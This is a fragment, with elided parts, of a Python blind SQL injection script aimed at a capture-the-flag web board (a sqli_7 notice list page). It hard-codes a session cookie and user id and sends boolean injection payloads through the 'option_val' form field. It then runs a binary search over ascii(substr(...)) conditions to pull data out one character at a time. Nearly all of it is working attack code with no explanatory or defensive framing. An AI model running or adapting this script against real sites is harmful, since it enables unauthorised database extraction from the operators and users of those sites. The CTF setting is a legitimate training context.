...
phpsess='ul13qdvq7l82i6d4e08m6qc8u0'
userid = "ctfkill"
keyword = "found"
...
def binSearch(query, checkValue):
    ...
    while True:
        ...
        response = requests.post(links, data={'option_val':payload,'board_result':keyword,'board_search':"", 'date_from':"", 'date_to':""}, cookies={'session':session,'PHPSESSID':phpsess})
...
print("\n type link ex : http://ctf.segfaulthub.com:7777/sqli_7/notice_list.php")
links = "http://"+input("Link(without parameter) : http://")
sqliCheckPayload = "'1'='1' and true and title"



successfulResponse = requests.post(links, data={'option_val':'title','board_result':keyword,'board_search':"", 'date_from':"", 'date_to':""}, cookies={'session':session,'PHPSESSID':phpsess} )
sqliResponse = requests.post(links, data={'option_val':sqliCheckPayload,'board_result':keyword,'board_search':"", 'date_from':"", 'date_to':""}, cookies={'session':session,'PHPSESSID':phpsess})
...
selectCheckPayload = "'1'='1' and ((select 'test')='test') and title"
selectResponse = requests.post(links, data={'option_val':selectCheckPayload,'board_result':keyword,'board_search':"", 'date_from':"", 'date_to':""}, cookies={'session':session,'PHPSESSID':phpsess})
...
#ctfkill' and (ascii(substr((중요 쿼리),1,1)) > 0) and '1'='1
attackFormatStart = "'1'='1' and "
truefalsereverse = "!"
...
#ctfkill' and (ascii(substr((__),1,1)) > 0) and '1'='1
